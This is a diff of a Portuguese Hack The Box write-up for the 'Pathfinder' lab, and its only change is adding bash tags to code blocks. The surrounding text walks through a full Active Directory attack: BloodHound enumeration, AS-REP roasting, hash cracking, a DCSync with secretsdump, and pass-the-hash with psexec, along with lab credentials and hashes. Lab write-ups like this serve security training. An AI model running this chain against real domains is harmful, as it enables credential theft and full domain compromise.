@@ -25,7 +25,7 @@ alt: "HTB Pathfinder Writeup"
 ## RECON
 
 ### Nmap
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Pathfinder]
 └─$ sudo nmap -v -p- -sCV -O -Pn 10.10.10.30 --min-rate=512
 PORT      STATE SERVICE       VERSION
@@ -67,7 +67,7 @@ Também temos o WinRM na porta 5985, estas informações indicam que estamos lid
 Desta vez, precisaremos fazer uma análise gráfica do AD, para tanto, vamos precisar de algumas ferramentas.
 A primeira delas é o injester `bloodhound` do python que pode ser instalado através do comando `pip install bloodhound`.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Pathfinder]
 └─$ pip install bloodhound
 Collecting bloodhound
@@ -86,7 +86,7 @@ Successfully installed bloodhound-1.1.1
 
 Como já temos as credenciais `sandra:Password1234!` obitadas na máquina anterior ([Shield](https://hastur666.github.io/posts/htb-shield-writeup/)), vamos tentar obter informações do AD.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Pathfinder]
 └─$ python3 -m bloodhound -d megacorp.local -u sandra -p 'Password1234!' -gc pathfinder.megacorp.local -c all -ns 10.10.10.30                                                                                                          130 ⨯
 INFO: Found AD domain: megacorp.local
@@ -105,7 +105,7 @@ INFO: Done in 00M 39S
 ```
 A autenticação aconteceu com sucesso, e o bloodhound salvou alguns arquivos `.json` com as informações do AD em nosso diretório de trabalho.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Pathfinder]
 └─$ ls -la
 total 116
@@ -123,7 +123,7 @@ Para conseguirmos de fato analisar estas informações, precisaremos de mais dua
 Antes de iniciarmos, precisamos configurar o ambiente com o neo4j e bloodhount.
 Primeiro vamos iniciar o neo4j `sudo neo4j console`.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Pathfinder]
 └─$ sudo neo4j console
 Directories in use:
@@ -158,7 +158,7 @@ As credenciais iniciais para utilizá-lo, são `neo4j:neo4j`. Logo no primeiro a
 
 Agora precisamos iniciar o bloodhound com o comando `bloodhound --no-sandbox`.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Pathfinder]
 └─$ bloodhound --no-sandbox
 (node:2824) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.
@@ -170,7 +170,7 @@ Ele irá solicitar as credenciais do `neo4j`.
 
 Para facilitar a importação dos dados, podemos compactar todos os arquivos .jsob que obtivemos e, em seguida, arrastar o arquivo .zip para dentro do bloodhound.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Pathfinder]
 └─$ zip pathfinder.zip *.json
   adding: 20210907181146_computers.json (deflated 74%)
@@ -196,7 +196,7 @@ Podemos fazer uma tentativa de PrivEsc Horizontal, ao tentar acesso com o usuár
 
 Vamos utilizar o `GetNPUsers.py` para verificar.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Pathfinder]
 └─$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py megacorp.local/svc_bes -request -no-pass -dc-ip 10.10.10.30
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -208,7 +208,7 @@ Conseguimos um `TGT ticket` para o usuário svc_bes!!!
 
 Vamos salvar este ticket no arquivo `hash` e tentar quebrá-lo com o `john`.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Pathfinder]
 └─$ echo '$krb5asrep$23$svc_bes@MEGACORP.LOCAL:73e00be48dcb9672655c008a25665eda$2e43937963ba72aeda130ab7f779f22a9bd1c5526fe6f70ae93c30beeb9266ef5a55c258b0bdca4f86706866d14f0fdff126ca6100e97e7873399243fab54231776f227db65352acec98a8b37fee5e33f1cba334254e60d724cef56a5d481db3fb5e3060274237748dc7bae98b5b1dbdc1a3e6512f9437d4e244ade19d8da1aef42b5a718696f5c4caafc779092d6b7bd03671083569feb0b8789fe16b27afe53afdfc417a347c8db69738c5593ec54f5c2d2e2d86d9fab115475a474940a5edc2876b22b13fe1e60b6642ca01c0830cd11222b0d0292ab62a8bd97732ab04f9778763e1a80ee18267f6914a1580a774' > hash
                                                                                                                                                                                                                                              
@@ -236,7 +236,7 @@ A flag `user.txt` se encontra no Desktop do usuário.
 
 Como nosso usuário tem permissões `GetChangesAll`, podemos utilizar o `secretsdump.py` para conseguir a hash do administrador do DC.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Pathfinder]
 └─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -dc-ip 10.10.10.30 MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30                                                                                                  126 ⨯
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -271,7 +271,7 @@ PATHFINDER$:des-cbc-md5:6d37cd7904b6f7f2
 
 Com a hash do administrador, podemos utilizar a técnica de `Pass The Hash` (PTH), onde conseguimos nos autenticar no host não com a senha, mas com a hash do usuário. Para isso podemos utilizar o `psexec.py`.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Pathfinder]
 └─$ python3 /usr/share/doc/python3-impacket/examples/psexec.py megacorp.local/administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
